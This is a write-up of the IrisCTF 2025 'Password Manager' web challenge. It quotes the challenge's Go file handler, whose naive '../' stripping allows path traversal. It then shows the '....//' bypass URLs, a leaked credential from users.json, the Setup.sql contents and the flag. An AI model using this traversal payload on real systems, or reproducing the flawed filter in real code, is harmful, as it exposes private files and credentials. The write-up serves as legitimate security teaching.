---
title: "Password Manager"
categories: [CTF, IrisCTF2025]
tags: [web]
date: 2025-01-04 19:44:00 +0100
media_subpath: /assets/img/posts/IRISCTF2025/
description: Writup of "Password Manager" challange in IrisCTF 2025.
---
## Challange
We have a self-developed password manager and need to find a way to retrieve the passwords from it.

## Solution 
This was quite a simple challenge. After examining the website code, I found this code:
 ```go
var PathReplacer = strings.NewReplacer("../", "",)
<snip>
func pages(w http.ResponseWriter, r *http.Request) {
	// You. Shall. Not. Path traverse!
	path := PathReplacer.Replace(r.URL.Path)

	if path == "/" {
		homepage(w, r)
		return
	}

	if path == "/login" {
		login(w, r)
		return
	}

	if path == "/getpasswords" {
		getpasswords(w, r)
		return
	}

	fullPath := "./pages" + path

	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		notfound(w, r)
		return
	}

	http.ServeFile(w, r, fullPath)
}
 ```
The initial vulnerability arises from the pathReplacer only replacing "" and "../" which permits Path Traversal with a payload like: `....//`, which gets replaced to: `../`.

 ### Exploit 
With this exploit in mind we can do the following exploit: 
`https://password-manager-web.chal.irisc.tf/....//users.json`

Which gets us: 
`skat	"rf=easy-its+just&spicysines123!@"`

However, this is not the solution. We need to obtain the flag. After some time, I tried using `https://password-manager-web.chal.irisc.tf/....//`, which allowed me to view all files in the root directory.
![Path traversal password manager](IrisCTF2025PasswordManager.png)
Upon Opening the `Setup.sql` i found the remaining information and the flag: 
```SQL
CREATE DATABASE uwu;
use uwu;
CREATE TABLE IF NOT EXISTS passwords ( URL text, Title text, Username text, Password text ) DEFAULT CHARSET=utf8mb4 DEFAULT COLLATE utf8mb4_0900_as_cs;

INSERT INTO passwords ( URL, Title, Username, Password ) VALUES ( "https://example.com", "Discord", "skat@skat.skat", "mypasswordisskat");

INSERT INTO passwords ( URL, Title, Username, Password ) VALUES ( "https://example.com", "RF-Quabber Forum", "skat", "irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}");

INSERT INTO passwords ( URL, Title, Username, Password ) VALUES ( "https://2025.irisc.tf", "Iris CTF", "skat", "this-isnt-a-real-password");

CREATE USER 'readonly_user'@'%' IDENTIFIED BY 'password';
GRANT SELECT ON uwu.passwords TO 'readonly_user'@'%';
FLUSH PRIVILEGES;
```

And so we got the flag: `irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}`